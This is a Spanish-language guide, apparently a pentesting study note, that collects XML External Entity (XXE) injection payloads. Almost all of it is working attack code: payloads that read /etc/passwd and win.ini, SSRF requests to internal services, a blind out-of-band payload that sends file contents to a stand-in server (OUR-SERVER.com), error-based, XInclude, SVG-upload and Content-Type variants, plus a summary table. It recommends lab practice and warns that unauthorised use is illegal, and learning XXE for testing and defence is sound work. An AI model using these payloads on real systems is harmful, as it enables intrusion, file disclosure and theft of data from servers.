
# Payloads para XXE (XML External Entity Injection)

En esta guía recopilamos los **payloads más importantes para explotar XXE**, explicando su uso, objetivo y contexto. Todos estos ejemplos deben probarse únicamente en entornos de laboratorio.

---

## 1. Lectura de archivos locales (File Disclosure)

El payload clásico para leer un archivo del sistema:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
````

* Definimos `xxe` como una entidad que apunta a un archivo local.
* El servidor reemplaza `&xxe;` por el contenido del archivo.

Otro ejemplo apuntando a un archivo sensible en Windows:

```xml
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> 
]>
<data>&xxe;</data>
```

---

## 2. SSRF mediante XXE

Podemos obligar al servidor a realizar peticiones HTTP a recursos internos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"> 
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

* Útil para descubrir **servicios internos** o interactuar con APIs.

---

## 3. XXE Ciego con exfiltración Out-of-Band (OOB)

Cuando la respuesta no nos devuelve directamente el resultado, podemos extraer datos enviándolos a un servidor bajo nuestro control.

Ejemplo para filtrar `/etc/passwd` hacia un servidor externo:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OUR-SERVER.com/?data=%file;'>">
  %eval;
  %exfil;
]>
```

* `%file` lee `/etc/passwd`.
* `%eval` construye una nueva entidad.
* `%exfil` envía el contenido a `OUR-SERVER.com`.

---

## 4. Basado en errores (Error-based XXE)

Provocamos un fallo que revele datos en el mensaje de error:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY fail SYSTEM "file:///does/not/exist/%xxe;">
]>
<foo>&fail;</foo>
```

---

## 5. XInclude (cuando no podemos usar DOCTYPE)

Algunos entornos bloquean `DOCTYPE`, pero podemos usar XInclude:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## 6. XXE vía subida de archivos

Podemos incrustar payloads en archivos basados en XML, como SVG:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg height="100" width="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Si el servidor procesa el SVG, mostrará el contenido de `/etc/passwd`.

---

## 7. Cambio de Content-Type

Forzamos a que un endpoint interprete entrada como XML:

```
POST /api HTTP/1.1
Host: vulnerable.com
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>
```

---

## Resumen rápido

| Payload / Técnica       | Ejemplo clave                                          | Objetivo principal |
| ----------------------- | ------------------------------------------------------ | ------------------ |
| File Disclosure         | `<!ENTITY xxe SYSTEM "file:///etc/passwd">`            | Leer archivos      |
| SSRF via XXE            | `<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">`        | Pivoting interno   |
| Blind XXE (OOB)         | `%exfil SYSTEM "http://OUR-SERVER.com/?%file;"`        | Exfiltración       |
| Error-based XXE         | `<!ENTITY fail SYSTEM "file:///does/not/exist/%xxe;">` | Filtrado por error |
| XInclude                | `<xi:include href="file:///etc/passwd"/>`              | Sin DOCTYPE        |
| File upload (SVG, DOCX) | SVG con `&xxe;`                                        | Vía ficheros XML   |
| Modified Content-Type   | Mandar XML en `text/xml` aunque no se espere           | Forzar parser      |

---

## Conclusión

Estos payloads representan los escenarios más comunes de explotación XXE.
La práctica en laboratorios como **PortSwigger Academy** es fundamental para afianzar estas técnicas.
Siempre debemos recordar que en entornos reales, el uso ofensivo sin autorización es ilegal: lo aplicamos solo en entornos de pruebas controladas.

---
